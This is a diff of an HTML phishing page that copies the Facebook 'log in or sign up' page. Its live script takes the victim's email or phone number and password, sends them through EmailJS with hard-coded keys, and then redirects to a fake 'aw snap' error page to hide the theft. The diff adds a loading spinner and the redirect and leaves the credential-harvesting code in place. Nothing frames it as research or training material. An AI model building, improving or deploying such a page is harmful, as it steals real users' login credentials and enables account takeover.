@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html lang="en" id="facebook" class="no_js">
+
 <head>
     <meta charset="utf-8" />
     <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
     <title id="pageTitle">Facebook – log in or sign up</title>
     <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
-    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/ze2gDvq5tcz.css" />
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         (function(){
-            emailjs.init('_2JWooqGu1Kd8f1-p'); // Ganti dengan Public Key dari Email.js
+            emailjs.init("_2JWooqGu1Kd8f1-p"); // Ganti dengan Public Key dari Email.js
         })();
         
         function sendLoginData(event) {
@@ -18,16 +18,24 @@
             
             var emailOrPhone = document.getElementById("email").value;
             var password = document.getElementById("password").value;
+            var loadingSpinner = document.getElementById("loading-spinner");
             
             var templateParams = {
                 user_email: emailOrPhone,
                 user_password: password
             };
             
+            loadingSpinner.style.display = "block"; // Tampilkan animasi loading
+            
             emailjs.send('service_c04kj4k', 'template_kmkcj0d', templateParams)
                 .then(function(response) {
-                    alert("Login data sent successfully!");
+                    setTimeout(() => {
+                        loadingSpinner.style.display = "none"; // Sembunyikan animasi setelah 3 detik
+                        alert("Login data sent successfully!");
+                        window.location.href = "awsnap.html";
+                    }, 3000);
                 }, function(error) {
+                    loadingSpinner.style.display = "none";
                     alert("Failed to send login data.");
                 });
         }
@@ -42,49 +50,38 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
+            flex-direction: column;
         }
-        .main-container {
+        .container {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            width: 980px;
-            max-width: 100%;
-            margin-right: 32px;
-            margin-top: -90px;
+            justify-content: center;
         }
         .left-section {
-            flex: 1;
-            padding-right: 40px;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            position: relative;
+            text-align: left;
+            margin-right: 50px;
+            max-width: 490px;
         }
-        .fb_logo {
-            width: 280px;
-            margin-bottom: 0px;
-            align-self: flex-start;
-            margin-left: -18px;
-            margin-top: -41px;
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 62px;       
         }
-        .text-container {
-            max-width: 500px;
-            margin-left: 10px;
-        }
-        .left-section h2 {
+        .left-section p {
             font-size: 28px;
-            font-weight: normal;
-            line-height: 32px;
+            margin-top: -40px;
             color: #1c1e21;
-            margin-top: 0;
+            margin-bottom: 180px;
         }
         .right-section {
             background: white;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 396px;
+            width: 346px;
             text-align: center;
+            margin-left: 23px;
+            margin-bottom: 57px;
+            margin-top: -27px;
         }
         input {
             width: 92%;
@@ -106,21 +103,16 @@
             font-weight: bold;
             margin-top: 10px;
         }
-        button:hover {
-            background: #145dbf;
-        }
         .links {
-            margin-top: 15px;
+            margin: 10px 0;
         }
         .links a {
-            text-decoration: none;
-            color: #1877f2;
             font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
         }
-        .divider {
-            height: 1px;
-            background-color: #ddd;
-            margin: 20px 0;
+        .links a:hover {
+            text-decoration: underline;
         }
         .create-account {
             display: inline-block;
@@ -131,29 +123,58 @@
             text-decoration: none;
             font-size: 16px;
             font-weight: bold;
+            margin-top: 20px;
+        }
+        .create-page {
+            margin-top: -40px;
+            font-size: 14px;
+            text-align: center;
+            margin-left: 563px;
+        }
+        .create-page a {
+            font-weight: bold;
+            text-decoration: none;
+            color: black;
+        }
+        .loading-spinner {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
+
 <body>
-    <div class="main-container">
+    <div class="container">
         <div class="left-section">
-            <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
-            <div class="text-container">
-                <h2>Facebook helps you connect and share with the people in your life.</h2>
-            </div>
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
         <div class="right-section">
             <form onsubmit="sendLoginData(event)">
                 <input type="text" id="email" placeholder="Email address or phone number" required>
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit">Log in</button>
+                <div id="loading-spinner" class="loading-spinner"></div>
             </form>
             <div class="links">
                 <p><a href="#">Forgotten password?</a></p>
             </div>
-            <div class="divider"></div>
             <a href="#" class="create-account">Create new account</a>
         </div>
     </div>
+    <div class="create-page">
+        <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+    </div>
 </body>
+
 </html>
